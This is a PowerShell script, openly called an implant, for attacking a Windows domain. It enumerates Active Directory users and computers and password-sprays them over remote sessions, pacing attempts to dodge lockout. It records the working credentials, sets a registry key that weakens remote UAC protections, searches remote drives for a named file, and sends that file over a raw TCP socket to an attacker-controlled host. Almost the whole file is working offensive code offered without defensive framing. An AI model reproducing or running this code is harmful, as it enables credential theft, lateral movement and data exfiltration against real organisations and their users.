    function BeginImplant {
        param(
            [Parameter(Mandatory=$true)]
            [string]$PassList,
            [Parameter(Mandatory=$true)]
            [string]$FileName,
            [Parameter(Mandatory=$true)]
            [string]$Target,
            [Parameter(Mandatory=$false)]
            [string]$LogFile
        )

        # Initialize variables
        $global:LockedOutAccounts = @{}
        $global:ObservationWindow = 30  # Default observation window in minutes
        $global:AttemptsBeforeLockout = 5  # Default lockout threshold
        $global:SuccessfulLogins = @()
        $global:UserProgress = @{}
        $global:UserProgress.Clear()
    
        # Parse target into IP and Port
        $TargetParts = $Target -split ":"
        $ServerIP = $TargetParts[0]
        $ServerPort = $TargetParts[1]
        $TotalAttempts = 0
        
    
        # Main execution flow
        try {
            Write-Host "[*] Starting implant operations..."
        
            # Step 1: Get domain computers
            $Computers = GetDomainComputers
            if (-not $Computers) {
                Write-Host "[-] No domain computers found"
                return
            }
            Write-Host "[+] Found $($Computers.Count) domain computers"
        
            # Step 2: Get domain users
            $Users = GetDomainUsers
            if (-not $Users) {
                Write-Host "[-] No domain users found"
                return
            }
            Write-Host "[+] Found $($Users.Count) domain users"
            foreach ($User in $Users) {
                $UserProgress[$User.SamAccountName] = 0
            }

        
            # Step 3: Get password list
            $Passwords = Get-Content $PassList -ErrorAction Stop
            if (-not $Passwords) {
                Write-Host "[-] No passwords found in password list"
                return
            }
            Write-Host "[+] Loaded $($Passwords.Count) passwords"

            $MaxAttempts = $Users.Count * $Passwords.Count
        
            foreach ($Computer in $Computers) {
                $loggedInUsers = {}
                while ($loggedInUsers -lt $User.Count -and $TotalAttempts -lt $MaxAttempts ) {
                    foreach ($User in $Users) {
                        if ($User.SamAccountName -in $loggedInUsers) {
                            continue
                        }
                        #foreach ($Password in $Passwords) {
                        for ($i = $global:UserProgress[$User.SamAccountName]; $i -lt $Passwords.Count; $i++) {
                            $Password = $Passwords[$i]
                            # Check if account is locked out
                            if ($global:LockedOutAccounts.ContainsKey($User.SamAccountName)) {
                                $lockoutTime = $global:LockedOutAccounts[$User.SamAccountName]
                                $timeSinceLockout = (Get-Date) - $lockoutTime
                        
                                if ($timeSinceLockout.TotalMinutes -lt $global:ObservationWindow) {
                                    Write-Host "[*] Account $($User.SamAccountName) is locked out. Skipping user..."
                                    break
                                } else {
                                    $global:LockedOutAccounts.Remove($User.SamAccountName)
                                }
                            }
                    
                            # Attempt login
                            $cred = $null
                            try {
                                
                                $securePass = ConvertTo-SecureString $Password -AsPlainText -Force
                                $cred = New-Object System.Management.Automation.PSCredential("$($User.SamAccountName)", $securePass)
                        
                                # Does it work tho (should error if not, then catch)
                                $session = New-PSSession -ComputerName $Computer.Name -Credential $cred -ErrorAction Stop
                        
                                Write-Host "[+] Successful login: $($User.SamAccountName):$Password on $($Computer.Name)"

                                $TotalAttempts -= $i
                                $MaxAttempts -= $Passwords.Count
                        
                                # Log successful login
                                $loginInfo = @{
                                    Username = $User.SamAccountName
                                    Password = $Password
                                    Computer = $Computer.Name
                                    Timestamp = Get-Date
                                }
                                $global:SuccessfulLogins += $loginInfo

                                $loggedInUsers += $User.SamAccountName
                        
                                if ($LogFile) {
                                    "$($User.SamAccountName):$Password on $($Computer.Name) at $(Get-Date)" | Out-File $LogFile -Append
                                }
                        
                                # Search for the file recursively, through directories.
                                $fileFound = Invoke-Command -Session $session -ScriptBlock {
                                    param($FileName)
                                    $file = Get-ChildItem -Path C:\ -Recurse -Force -Filter $FileName -ErrorAction SilentlyContinue | Select-Object -First 1
                                    if ($file) {
                                        return $file.FullName
                                    }
                                    return $null
                                } -ArgumentList $FileName
                        
                                if ($fileFound) {
                                    Write-Host "[+] Found target file : $fileFound"
                                    # Set registry key
                                    # Should be using th privileges of target (Administrator)
                                    Invoke-Command -Session $session -ScriptBlock {
                                        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
                                        $regName = "LocalAccountTokenFilterPolicy"
                                
                                        if (-not (Test-Path $regPath)) {
                                            New-Item -Path $regPath -Force | Out-Null
                                        }
                                
                                        if (-not (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue)) {
                                            New-ItemProperty -Path $regPath -Name $regName -Value 1 -PropertyType DWORD -Force | Out-Null
                                        } else {
                                            Set-ItemProperty -Path $regPath -Name $regName -Value 1 -Force | Out-Null
                                        }
                                
                                        Write-Host "[+] Registry key set successfully"
                                    }
                            
                                    # Get file contents
                                    #$fileContent = Invoke-Command -Session $session -ScriptBlock {
                                    #    param($filePath)
                                    #    return [System.IO.File]::ReadAllBytes($filePath)
                                    #} -ArgumentList $fileFound

                                    # Sendback to OG machine as raw bytes
                                    Invoke-Command -Session $session -ScriptBlock {
                                        param($filePath, $ServerIP, $Port)
                                        $client = New-Object System.Net.Sockets.TcpClient($ServerIP, $Port)
                                        $stream = $client.GetStream()
                                        $writer = New-Object System.IO.BinaryWriter($stream)
                                        $fileContent = [System.IO.File]::ReadAllBytes($filePath)

                                        $writer.Write($fileContent)
                                        $writer.Flush()

                                        $writer.Close()
                                        $stream.Close()
                                        $client.Close()

                                        Write-Host "[+] File successfully exfiltrated to {$ServerIP}:$Port"
                                    } -ArgumentList $filePath, $ServerIP, $ServerPort
                            
                                    # Clean up
                                    Remove-PSSession $session
                                    return # breaks out of whole function ? 
                                }
                        
                                # Clean up session if no file found
                                Remove-PSSession $session
                            }
                            catch [System.Management.Automation.Remoting.PSRemotingTransportException] {
                                if ($_.Exception.Message -like "*account is currently locked out*") {
                                    Write-Host "[-] Account $($User.SamAccountName) is locked out"
                                    $global:LockedOutAccounts[$User.SamAccountName] = Get-Date
                                    $global:UserProgress[$User.SamAccountName] = $i # Save where we left off.
                                }
                            }
                            catch {
                                # Ignore other errors and continue
                            }
                        }
                }
                }
            }
        
            Write-Host "[-] Target file not found on any accessible computer"
        }
        catch {
            Write-Host "[-] Error in main execution: $_"
        }
    }

    function GetDomainComputers {
        try {
            $searcher = [ADSISearcher]"(objectCategory=Computer)"
            $searcher.PageSize = 200
            $computers = $searcher.FindAll() | ForEach-Object {
                $_.GetDirectoryEntry()
            }
            return $computers
        }
        catch {
            Write-Host "[-] Error enumerating domain computers: $_"
            return $null
        }
    }

    function GetDomainUsers {
        try {
            $searcher = [ADSISearcher]"(objectCategory=User)"
            $searcher.PageSize = 200
            $users = $searcher.FindAll() | ForEach-Object {
                $_.GetDirectoryEntry()
            }
            return $users
        }
        catch {
            Write-Host "[-] Error enumerating domain users: $_"
            return $null
        }
    }

    #Export-ModuleMember -Function BeginImplant
